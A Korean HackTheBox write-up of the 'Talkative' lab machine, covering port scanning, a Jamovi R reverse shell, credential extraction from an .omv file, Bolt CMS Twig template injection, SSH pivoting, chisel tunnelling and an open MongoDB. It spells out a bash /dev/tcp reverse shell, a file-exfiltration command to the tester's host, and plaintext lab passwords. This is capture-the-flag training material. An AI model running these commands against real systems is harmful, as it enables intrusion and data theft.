---
title: "Talkative (Hard)"
date: 2025-11-05
layout: single
excerpt: "Talkative는 하드 난이도의 Linux 머신으로, 초기 진입점은 Jamovi 웹 애플리케이션에 존재하는 명령어 삽입(Command Injection) 취약점으로, 이를 이용해 Jamovi가 실행 중인 Docker 컨테이너 내부로 진입할 수 있다. 컨테이너 내부에서는 .omv 파일을 발견할 수 있으며, 이를 압축 해제함으로써 Bolt CMS의 admin 사용자 자격 증명을 확보할 수 있으며, 확보한 계정으로 로그인한 후에는, Twig 템플릿 엔진에 존재하는 SSTI(Server Side Template Injection) 취약점을 이용해 www-data 권한의 셸을 획득할 수 있다. 이후 네트워크를 추가로 탐색하면, 내부 시스템에 존재하는 saul 사용자로 권한을 확장할 수 있다. root 권한을 얻기 위해서는 포트 포워딩을 설정하여, 별도의 컨테이너에서 실행 중인 MongoDB 인스턴스에 접속해야 하며, 이를 통해 RocketChat에 등록된 사용자의 권한을 조작하여 웹 GUI의 관리자 대시보드에 접근할 수 있다. 이후 RocketChat의 웹훅(Webhook) 기능을 추가로 악용함으로써, RocketChat 컨테이너 내부에서 root 셸을 획득할 수 있다. 마지막으로, 컨테이너 내에서 libcap2 패키지를 설치하고 시스템 Capabilities를 조회하면 CAP_DAC_READ_SEARCH 권한이 활성화되어 있음을 확인할 수 있으며, 이를 악용하여 shocker 익스플로잇을 실행하고 호스트의 루트 권한을 탈취할 수 있다"
author_profile: true
toc: true
toc_label: "Talkative"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/talkative/talkative.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, docker, web, command-injection, rce, ssti, reverse-shell, priv-esc, mongodb, rocket.chat, twig, bolt-cms, chisel, capabilities, shadow, webhook]
---

![Talkative](/assets/htb-linux/talkative/talkative.png)

**Talkative**는 하드 난이도의 Linux 머신이다.  
초기 진입점은 `Jamovi` 웹 애플리케이션에 존재하는 **명령어 삽입(Command Injection)** 취약점으로, 이를 이용해 `Jamovi`가 실행 중인 **Docker 컨테이너 내부로 진입**할 수 있다. 컨테이너 내부에서는 `.omv` 파일을 발견할 수 있으며, 이를 압축 해제함으로써 `Bolt CMS`의 `admin` 사용자 자격 증명을 확보할 수 있다.

확보한 계정으로 로그인한 후에는, `Twig` 템플릿 엔진에 존재하는 **SSTI(Server Side Template Injection)** 취약점을 이용해 `www-data` 권한의 셸을 획득할 수 있다.

이후 네트워크를 추가로 탐색하면, 내부 시스템에 존재하는 `saul` 사용자로 **권한을 확장**할 수 있다 `root` 권한을 얻기 위해서는 **포트 포워딩을 설정하여**, 별도의 컨테이너에서 실행 중인 `MongoDB` 인스턴스에 접속해야 하며, 이를 통해 `RocketChat`에 등록된 사용자의 권한을 조작하여 웹 GUI의 **관리자 대시보드에 접근**할 수 있다.

이후 `RocketChat`의 **웹훅(Webhook)** 기능을 추가로 악용함으로써, `RocketChat` 컨테이너 내부에서 `root` 셸을 획득할 수 있다.

마지막으로, 컨테이너 내에서 `libcap2` 패키지를 설치하고 **시스템 Capabilities**를 조회하면 `CAP_DAC_READ_SEARCH` 권한이 활성화되어 있음을 확인할 수 있으며, 이를 악용하여 `shocker` 익스플로잇을 실행하고 **호스트의 루트 권한을 탈취**할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.227.113`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.227.113
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 12:05 EST
Nmap scan report for 10.129.227.113
Host is up (0.20s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Did not follow redirect to http://talkative.htb
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: iRFLaerkikrQB5NcB
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 05 Nov 2025 17:05:25 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: iRFLaerkikrQB5NcB
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 05 Nov 2025 17:05:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
8082/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/5%Time=690B83D4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20iRFLaerkikrQB5NcB\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Wed,\x2005\x20Nov\x202
SF:025\x2017:05:25\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTT
SF:POptions,1518,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20iRFLaerkikrQB5NcB\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Wed,\x2005\x20Nov\x202
SF:025\x2017:05:27\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten");
Service Info: Host: 172.17.0.15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```

Nmap 스캔 결과, `SSH(22)` 포트는 **filtered** 상태이며, `HTTP(80)` 및 여러 웹 서비스(`3000`, `8080`, `8081`, `8082`) 포트가 열려 있음을 확인했다.

또한, `HTTP(80)` 포트는 `talkative.htb` 도메인으로 리다이렉션되므로, 해당 도메인을 `/etc/hosts` 에 등록해야 정상적인 접근이 가능하다.

## 도메인 이름 설정 (/etc/hosts)

웹 서비스 접근을 위해 `/etc/hosts` 파일에 **10.129.227.113 talkative.htb**를 추가하였다.

```bash
$ cat /etc/hosts | grep htb

10.129.227.113  talkative.htb
``` 

---

# Vulnerability Analysis

## talkative.htb

`http://talkative.htb` 에 접속하면, Talkative라는 이름의 웹 서비스 소개 페이지가 표시된다.

![웹 사이트](/assets/htb-linux/talkative/talkative-web.png)

페이지의 소스코드를 확인해보면 `<meta name="generator" content="Bolt">` 태그를 통해 이 사이트가 **Bolt CMS**로 제작되었음을 알 수 있다.

> 공식 사이트: [Bolt](https://boltcms.io/)

![Bolt](/assets/htb-linux/talkative/talkative-source.png)

## TCP 3000 (ROCKET.CHAT)

`TCP 3000`번 포트로 접속하면, `Rocket.Chat` 서비스의 로그인 화면이 나타난다.

![로그인 화면](/assets/htb-linux/talkative/rocket-chat-login.png)

해당 페이지는 이메일 또는 사용자명과 비밀번호 입력 필드를 포함하고 있으며, 하단에는 비밀번호 재설정 및 계정 생성 링크도 제공된다.

또한 페이지 하단에는 "`Powered by Rocket.Chat`"이라는 문구가 표시되어, 해당 서비스가 오픈소스 채팅 플랫폼인 **Rocket.Chat** 기반임을 확인할 수 있다.

계정을 생성한 뒤 로그인하면, 내부 **Rocket.Chat** 대시보드에 접근할 수 있다.

![대시보드](/assets/htb-linux/talkative/rocket-chat-dashboard.png)

대시보드에서는 `#general` 채널이 존재하며, 이 곳에 사용자들이 참여해 있는 상태이다.

그리고 `Saul Goodman` 이라는 이름의 계정이 `@admin` 사용자명으로 등록되어 있으며, 이 계정은 `Admin` 권한을 가지고 있다.

## TCP 8080 (jamovi)

`TCP 8080` 에서 실행 중인 `Jamovi` 웹 애플리케이션에 접속하면, 위와 같은 **분석 도구 화면**이 표시된다.

![분석 도구 화면](/assets/htb-linux/talkative/jamovi.png)

### Jamovi RJ Editor Reverse Shell

상단 메뉴에서 `Analyses` 탭이 존재하며, 이 중 `R` 아이콘을 클릭하면 `Rj Editor` 모듈이 드롭다운 형태로 표시된다.

![Rj Editor](/assets/htb-linux/talkative/jamovi-rj.png)

여기서 `Rj Editor` 를 선택하면 R 코드를 직접 실행할 수 있는 편집기로 이동할 수 있다.

RJ 편집기에서 R 스크립트를 입력한 후, `Ctrl + Shift + Enter` 단축키를 사용하여 코드를 실행할 수 있다.

![실행 하는 방법](/assets/htb-linux/talkative/jamovi-rj-editor.png)

먼저, 로컬 터미널에서 `nc` 명령어로 리버스 셸을 수신 대기한다:

```bash
$ nc -lvnp 9001
```

이후 RJ 편집기 내에 다음과 같이 리버스 셸 명령어를 삽입하였다:

```r
system("bash -c 'bash -i >& /dev/tcp/10.10.14.171/9001 0>&1'", intern=TRUE)
```

해당 스크립트를 실행한 결과, 정상적으로 Docker 컨테이너 내부로 진입하는 데 성공하였다.

![리버스 셸 획득](/assets/htb-linux/talkative/jamovi-revshell.png)

### OMV File Retrieval and Credential Extraction

셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다.

```bash
root@b06821bbda78:/# script /dev/null -c bash

Script started, output log file is '/dev/null'.
```

`/root` 디렉터리로 이동한 뒤 `ls` 명령어를 실행한 결과, `bolt-administration.omv` 파일이 존재하는 것을 확인하였다:

```bash
root@b06821bbda78:~# ls

Documents  bolt-administration.omv
```

OMV 파일은 `zip` 형식으로 되어 있으며, 이를 로컬 호스트로 전송하기 위해 먼저 로컬에서 `nc` 리스너를 실행하였다:

```bash
$ nc -lvnp 9002 > bolt-administration.omv
```

그 후, Docker 컨테이너 내부에서 다음 명령어를 실행하여 파일을 전송하였다:

```bash
root@b06821bbda78:~# cat bolt-administration.omv > /dev/tcp/10.10.14.171/9002
```

압축된 .omv 파일을 `unzip` 명령어로 해제한 결과, 다음과 같은 파일들이 추출되었다:

```bash
$ ls -l 

total 32
drwxrwxr-x 2 kali kali 4096 Nov  5 21:23 '01 empty'
-rw-rw-r-- 1 kali kali 2192 Nov  5 14:59  bolt-administration.omv
-rw------- 1 kali kali   48 Aug 14  2021  data.bin
-rw------- 1 kali kali 2505 Aug 14  2021  index.html
-rw------- 1 kali kali  106 Aug 14  2021  meta
-rw------- 1 kali kali 1055 Aug 14  2021  metadata.json
drwxrwxr-x 2 kali kali 4096 Nov  5 21:23  META-INF
-rw------- 1 kali kali  433 Aug 14  2021  xdata.json
```

이 중 `xdata.json` 파일을 열어보면, 내부에 담당자들의 이메일 계정과 함께 비밀번호로 추정되는 문자열이 포함되어 있다:

```json
{
  "A": {
    "labels": [
      [0, "Username", "Username", false],
      [1, "matt@talkative.htb", "matt@talkative.htb", false],
      [2, "janit@talkative.htb", "janit@talkative.htb", false],
      [3, "saul@talkative.htb", "saul@talkative.htb", false]
    ]
  },
  "B": {
    "labels": [
      [0, "Password", "Password", false],
      [1, "jeO09ufhWD<s", "jeO09ufhWD<s", false],
      [2, "bZ89h}V<S_DA", "bZ89h}V<S_DA", false],
      [3, ")SQWGm>9KHEA", ")SQWGm>9KHEA", false]
    ]
  },
  "C": {
    "labels": []
  }
}
```

## Bolt CMS Login Page Discovery

초기 정찰 단계에서 `talkative.htb` 도메인이 **Bolt CMS** 기반으로 운영되고 있는 것을 확인하였다. 해당 경로로 접근 시, 자동으로 **Bolt CMS 로그인 페이지**로 리다이렉트된다.

![Bolt Login](/assets/htb-linux/talkative/bolt-login.png)

이후 `xdata.json` 파일에서 추출한 계정 정보를 이용해 Bolt CMS 로그인 시도를 하였으나, 해당 자격 증명으로는 로그인에 실패하였다.

![Fail](/assets/htb-linux/talkative/bolt-login-fail.png)

그러나 사용자명을 `admin`으로 설정하고, `xdata.json` 파일에 있던 비밀번호 `je0O9ufhWD<s` 를 입력하자 `saul` 관리자 계정으로 로그인에 성공하였다.

![Success](/assets/htb-linux/talkative/bolt-login-success.png)

---

# Exploitation

## Bolt CMS Template Injection

Bolt CMS 관리자 패널의 **SETTINGS → File management** 메뉴에서 `View & edit templates` 항목을 통해 템플릿 파일을 직접 수정할 수 있다.

![수정](/assets/htb-linux/talkative/bolt-templates.png)

> **[SSTI 인젝션](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/#twig-template-format) 관련 정보는 위 링크를 참고하였다.**

이후 `index.twig` 파일을 열어 상단에 아래와 같은 SSTI 페이로드를 삽입하였다:

![삽입](/assets/htb-linux/talkative/bolt-id.png)

이 코드는 Twig에서 `system('id')` 명령어를 실행하게 하여, OS 명령 실행이 가능한지 여부를 판단하기 위한 것이다.

수정한 내용을 적용하기 위해, **SETTINGS → Maintenance** 경로에서 `Clear the cache` 기능을 사용하여 템플릿 캐시를 초기화한다. 이 과정을 통해 변경된 Twig 파일 내용이 반영된다.

![캐시 초기화](/assets/htb-linux/talkative/bolt-cache.png)

캐시를 초기화한 뒤 웹사이트에 접속하면, 다음과 같이 `system('id')` 명령어가 실행되고 있음을 확인할 수 있다:

![명령어 실행 성공](/assets/htb-linux/talkative/bolt-id-success.png)

나의 로컬 터미널에서 `nc` 명령어를 실행해 리버스 셸을 받을 준비를 해두었다:

```bash
$ nc -lvnp 9002
```

그 후, `index.twig` 템플릿 파일로 돌아가 아래 리버스 셸 페이로드를 삽입하였다:

![리버스 셸 삽입](/assets/htb-linux/talkative/bolt-revshell.png)

해당 스크립트를 실행한 결과, 정상적으로 `web-data` 권한으로 웹 서버 내부 셸 접근에 성공하였다.

![리버스 셸 획득](/assets/htb-linux/talkative/web-reverse-shell.png)

---

# Privilege Escalation

## www-data → saul Lateral Movement

`www-data` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:

```bash
www-data@657931ca6e84:/var/www/talkative.htb/bolt/public$ script /dev/null -c bash

Script started, output log file is '/dev/null'.
```

업그레이드한 후, 컨테이너가 연결된 내부 네트워크 구조를 파악하기 위해 `/proc/net/fib_trie` 파일을 먼저 확인하였다. 

이를 통해 현재 컨테이너가 `172.17.0.0/16` Docker 브리지 네트워크 대역에 속해 있음을 확인할 수 있었다:

```bash
+-- 172.17.0.0/16 2 0 2
   +-- 172.17.0.0/28 2 0 2
      |-- 172.17.0.0
         /32 link BROADCAST
         /16 link UNICAST
      |-- 172.17.0.15
         /32 host LOCAL
        # [SKIP] ..
```

이후, 실제로 통신 가능한 호스트가 존재하는지 확인하기 위해 `/proc/net/arp` 파일을 확인하였다:

```bash
www-data@657931ca6e84:/proc/net$ cat arp

IP address       HW type     Flags       HW address            Mask     Device
172.17.0.1       0x1         0x2         02:42:94:72:e3:08     *        eth0
```

ARP 테이블에 나타난 `172.17.0.1` 주소는 Docker 브리지 네트워크 상에 존재하는 다른 호스트 또는 컨테이너로, ARP 응답이 성공적으로 이루어진 것으로 보아 실제로 통신 가능한 상태임을 알 수 있다.

현재 컨테이너의 정보는 다음과 같다:
- 호스트 이름: `657931ca6e84`
- IP 주소: `172.17.0.15`

앞서 `/proc/net/arp` 에서 확인한 내부 IP `172.17.0.1` 을 대상으로, `xdata.json` 에서 추출한 자격 정보를 활용하여 SSH 연결을 시도하였다:

```bash
www-data@657931ca6e84:~$ ssh saul@172.17.0.1
```

여러 조합을 대입해본 결과, `saul` 사용자 계정으로 SSH 셸을 획득하는 데 성공하였다.

![SSH 셸 획득](/assets/htb-linux/talkative/saul.png)

## Identifying Open MongoDB Ports

`saul` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:

```bash
saul@talkative:~$ script /dev/null -c bash

Script started, file is /dev/null
```

컨테이너 내부에서 직접적으로 외부 네트워크와의 연결 지점을 파악하기 위해 `ps` 명령어를 사용하여 Docker 관련 프로세스를 확인하였다:

```bash
saul@talkative:/tmp$ ps aux | grep docker

root         959  0.2  2.2 1529512 45332 ?       Ssl  09:37   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1229  0.0  0.1 1149100 3884 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.2 -container-port 80
root        1405  0.0  0.1 1222576 3704 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
root        1410  0.0  0.1 1148844 3772 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
root        1426  0.0  0.1 1148844 3800 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
root        1433  0.0  0.1 1222576 3656 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
root        1447  0.0  0.1 1149100 3904 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
root        1453  0.0  0.1 1222576 3776 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
root        1541  0.0  0.1 1148844 3792 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.4 -container-port 80
root        1693  0.0  0.1 1148844 3940 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.5 -container-port 80
root        1763  0.0  0.1 1223984 3844 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.6 -container-port 3000
root        1901  0.0  0.1 1222576 3808 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.7 -container-port 80
root        2067  0.0  0.1 1148844 3856 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.8 -container-port 80
root        2244  0.0  0.1 1075112 3736 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.9 -container-port 80
root        2353  0.0  0.1 1148844 3928 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.10 -container-port 80
root        2462  0.0  0.1 1149100 3900 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.11 -container-port 80
root        2574  0.0  0.1 1222576 3704 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.12 -container-port 80
root        2694  0.0  0.1 1075112 3872 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.13 -container-port 80
root        2805  0.0  0.1 1148844 3824 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.14 -container-port 80
root        2913  0.0  0.1 1149100 3928 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.15 -container-port 80
root        3025  0.0  0.1 1148844 3800 ?        Sl   09:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.16 -container-port 80
root        3140  0.0  0.1 1148844 3724 ?        Sl   09:38   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.17 -container-port 80
root        3253  0.0  0.1 1222576 3800 ?        Sl   09:38   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.18 -container-port 80
root        3375  0.0  0.1 1075112 3812 ?        Sl   09:38   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.19 -container-port 80
saul        4107  0.0  0.0   6432   660 pts/1    S+   09:49   0:00 grep --color=auto docker
```

다수의 컨테이너가 `172.17.0.1` 인터페이스를 통해 외부와 연결되고 있으며, 각각의 컨테이너는 `6000` 번대 포트를 외부로 노출하고 있고 내부에서는 주로 `80` 번 포트를 사용 중인 것으로 나타났다.

이러한 정보를 바탕으로, 정적 컴파일된 바이너리 [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) 을 컨테이너 내에 업로드하여 포트 스캔을 수행하였다:

```bash
saul@talkative:~$ ./nmap -p- --min-rate=1000 -T4 172.17.0.2-19

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-06 09:53 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.17.0.3
Host is up (0.00052s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

# ...[SKIP]...
```

포트 스캔 도중 `172.17.0.3` 주소에서 `27017` 번 포트가 열려 있는 것을 확인하였다.

`27017` 포트는 일반적으로 **MongoDB** 서비스가 사용하는 기본 포트로, 해당 컨테이너에서 MongoDB가 실행 중일 가능성이 있다.

`nc` 명령어를 이용하여 `172.17.0.3` 의 `27017` 포트에 실제로 연결이 가능한지 확인하였다:

```bash
saul@talkative:~$ nc -vz 172.17.0.3 27017

Connection to 172.17.0.3 27017 port [tcp/*] succeeded!
```

위 결과를 통해 해당 포트가 열려 있고, 외부에서의 TCP 연결이 성공적으로 이루어짐을 확인할 수 있었다.

## Accessing Internal MongoDB via Chisel Port Forwarding

MongoDB에 접근하기 위해 [chisel](https://github.com/jpillora/chisel) 도구를 사용하여 포트 포워딩을 설정하였다.

먼저, 로컬 터미널에서 Chisel 서버를 다음과 같이 실행하였다:

```bash
$ ./chisel server -p 9003 --reverse
```

이후, 내부 SSH 서버에서 Chisel 클라이언트를 이용해 리버스 `SOCKS` 프록시 터널을 수립하였다:

```bash
saul@talkative:~$ ./chisel client 10.10.14.171:9003 R:socks

2025/11/06 10:04:13 client: Connecting to ws://10.10.14.171:9003
2025/11/06 10:04:15 client: Connected (Latency 197.44854ms)
```

프록시 체인을 통해 로컬 터미널에서 `nc` 명령어를 사용하여 내부 MongoDB 포트에 연결을 시도한 결과, 다음과 같이 연결이 성공적으로 이루어짐을 확인할 수 있었다:

```bash
$ proxychains nc -vz 172.17.0.3 27017

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:27017  ...  OK
172.17.0.3 [172.17.0.3] 27017 (?) open : Operation now in progress
```

이후, 프록시 체인을 적용하여 로컬 환경에서 MongoDB에 직접 접속을 시도하였고, 다음과 같이 성공적으로 연결되었다:

```bash
$ proxychains mongo --host 172.17.0.3 --port 27017

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
MongoDB shell version v7.0.14
connecting to: mongodb://172.17.0.3:27017/?compressors=disabled&gssapiServiceName=mongodb
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:27017  ...  OK
Implicit session: session { "id" : UUID("5b9b5e30-8ae2-44ae-982f-679abf32c4e3") }
MongoDB server version: 4.0.26
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
---
The server generated these startup warnings when booting: 
2025-11-06T09:37:51.827+0000 I STORAGE  [initandlisten] 
2025-11-06T09:37:51.827+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2025-11-06T09:37:51.827+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2025-11-06T09:37:53.190+0000 I CONTROL  [initandlisten] 
2025-11-06T09:37:53.190+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2025-11-06T09:37:53.190+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2025-11-06T09:37:53.190+0000 I CONTROL  [initandlisten] 
---
rs0:PRIMARY>
```

## Escalating User Privileges Using MongoDB

MongoDB에 접속한 후 `show dbs` 명령어를 통해 내부 데이터베이스 목록을 확인한 결과, **관리자가 생성한 것으로 보이는 사용자 정의 데이터베이스 `meteor`** 존재하였다:

```bash
rs0:PRIMARY> show dbs

admin   0.000GB
config  0.000GB
local   0.011GB
meteor  0.005GB
```

이후 `show tables` 명령어를 입력하자, Rocket.Chat과 관련된 테이블들이 다수 나열되었다:

```bash
rs0:PRIMARY> show tables

# ...[SKIP]...
rocketchat_uploads
rocketchat_user_data_files
rocketchat_webdav_accounts
system.views
ufsTokens
users
usersSessions
view_livechat_queue_status
```

